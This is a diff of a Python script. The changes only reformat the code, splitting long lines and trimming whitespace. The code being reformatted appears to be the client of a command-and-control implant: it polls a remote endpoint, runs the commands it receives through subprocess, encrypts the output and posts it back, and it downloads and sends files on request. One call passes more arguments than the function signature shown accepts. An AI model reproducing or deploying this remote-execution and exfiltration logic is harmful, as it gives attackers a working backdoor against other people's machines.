@@ -33,7 +33,7 @@ def main(endpoint_url):
             if not response.content:
                 time.sleep(2)
                 continue
-            data =  response.json()
+            data = response.json()
             command = data.get('command')
             if command:
                 command_type = data.get('type')
@@ -43,12 +43,12 @@ def main(endpoint_url):
                 id = data.get('id')
 
                 if command_type.startswith('dl'):
-                    download_file(endpoint_url, cid, id, ec, command, method, headers, body)
+                    download_file(endpoint_url, cid, id, ec,
+                                  command, method, headers, body)
                 if command_type.startswith('filedl'):
                     download_file(endpoint_url, cid, id, ec, command)
                 if command_type == 'cmd':
                     execute_command(endpoint_url, cid, id, ec, command)
-            
 
 
 def execute_command(endpoint_url, cid, id, ec, command):
@@ -64,11 +64,14 @@ def execute_command(endpoint_url, cid, id, ec, command):
         payload = {'output': ec.encrypt(output), "id": id, "cid": cid}
         response = requests.post(endpoint_url + "/command", data=payload)
         if response.status_code != 200:
-            send_error(endpoint_url, cid, id, "Failed to send the result to the endpoint.")
+            send_error(endpoint_url, cid, id,
+                       "Failed to send the result to the endpoint.")
     except subprocess.CalledProcessError as e:
-        send_error(endpoint_url, cid, id, f"Error during command execution: {e.output}")
+        send_error(endpoint_url, cid, id,
+                   f"Error during command execution: {e.output}")
     except Exception as e:
-        send_error(endpoint_url, cid, id, f"Error during command execution: {e}")
+        send_error(endpoint_url, cid, id,
+                   f"Error during command execution: {e}")
 
 
 def send_file(endpoint_url, cid, id, file, name):
@@ -83,7 +86,8 @@ def send_file(endpoint_url, cid, id, file, name):
 
 def send_error(endpoint_url, cid, id, msg):
     """Function to send an error message to the endpoint"""
-    requests.post(endpoint_url + "/error", data={"id": id, "cid": cid, "ret": msg})
+    requests.post(endpoint_url + "/error",
+                  data={"id": id, "cid": cid, "ret": msg})
 
 
 def download_file(cid, id, ec, file_url, method=None, headers=None, body=None):
